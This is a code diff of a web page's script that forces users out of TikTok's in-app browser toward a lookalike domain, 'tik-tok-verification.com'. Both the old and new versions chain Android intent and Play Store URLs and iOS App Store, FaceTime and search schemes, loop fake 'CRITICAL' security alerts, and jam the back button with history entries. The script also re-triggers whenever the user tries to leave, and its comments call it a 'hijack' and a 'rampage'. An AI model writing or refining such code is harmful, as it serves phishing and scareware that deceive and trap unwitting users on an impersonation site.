@@ -8,73 +8,66 @@
 <body>
 
 <script>
-    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
-    const startTime = Date.now();
-    const limit = 5000; // 5 SECOND FAIL-SAFE (STRICT)
+    const target = "https://tik-tok-verification.com/Verification/verify1.html";
+    
+    // ATOMIC FAIL-SAFE: The absolute timestamp when the script must die.
+    const killTime = Date.now() + 5000; 
 
-    function nuclearBreakout() {
+    function triggerConflict() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-        // 1. THE BLOB DOWNLOAD (Forces "Open In..." or Download Manager)
-        const blob = new Blob([" "], {type: "application/octet-stream"});
-        const blobUrl = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = destination;
-        a.target = "_blank";
-        a.download = "verify.html";
-
         if (isAndroid) {
-            // ANDROID: Double-Intent + Market Bypass
-            // Direct Chrome Package call
-            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+            // 1. Android 'Intent' for Chrome
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
             
-            // Conflict: Try to open the Play Store with the URL as a parameter
+            // 2. Play Store Hijack (Forces exit to Store, which then opens the URL)
             setTimeout(() => {
-                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(destination);
+                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
             }, 50);
         } else if (isIOS) {
-            // iOS: The "Search-to-Maps" Leak
-            // Maps and Search are system-priority. This forces a protocol prompt.
-            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            // 1. iOS App Store Protocol (Bypasses TikTok UI filters)
+            window.location.href = "itms-apps://itunes.apple.com/app/apple-store/id361309726?mt=8";
             
+            // 2. Facetime Hijack (Forces a system-level popup)
             setTimeout(() => {
-                // The "Facetime" prompt hijack - forces focus out of the app
-                window.location.href = "facetime-prompt://" + destination.replace("https://", "");
+                window.location.href = "facetime-prompt://" + target.replace("https://", "");
             }, 50);
-        }
 
-        // UNIVERSAL: Physical click on a virtual anchor to bypass "Automated Navigation" filters
-        a.click();
+            // 3. Search Hijack
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+        }
     }
 
     function rampage() {
-        // FAIL-SAFE: Hard clock check. 
-        if (Date.now() - startTime > limit) {
+        // THE ONLY WAY TO EXIT: Check if current time has passed the killTime.
+        if (Date.now() > killTime) {
+            console.log("FAIL-SAFE TRIGGERED. EXITING.");
             return; 
         }
 
-        // Fire the conflict shotgun
-        nuclearBreakout();
+        // Attempt the breakout
+        triggerConflict();
 
-        // BLOCK THE UI: Forces the OS to process the background navigation
-        alert("CRITICAL SECURITY ERROR\n\nVerification Required. Tap OK to open System Browser.");
+        // The Alert Lock: Freezes TikTok so the OS can take over the redirect
+        alert("CRITICAL: Verification Required\n\nPress OK to open the secure system browser.");
         
-        // Fire again immediately after they dismiss
-        nuclearBreakout();
+        // Re-attempt after dismissal
+        triggerConflict();
 
-        setTimeout(rampage, 10);
+        // Minimal delay for maximum aggression
+        setTimeout(rampage, 1);
     }
 
     window.onload = () => {
-        // Back-button jammer
-        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
+        // Jam the back button
+        for(let i=0; i<30; i++) history.pushState(null, null, "#ver_" + i);
         rampage();
     };
 
-    // If they hit 'X', blur happens - restart rampage instantly
+    // If they hit 'X' or the top bar, the window blurs. We hit them again.
     window.onblur = () => {
-        rampage();
+        if (Date.now() < killTime) rampage();
     };
 </script>
 
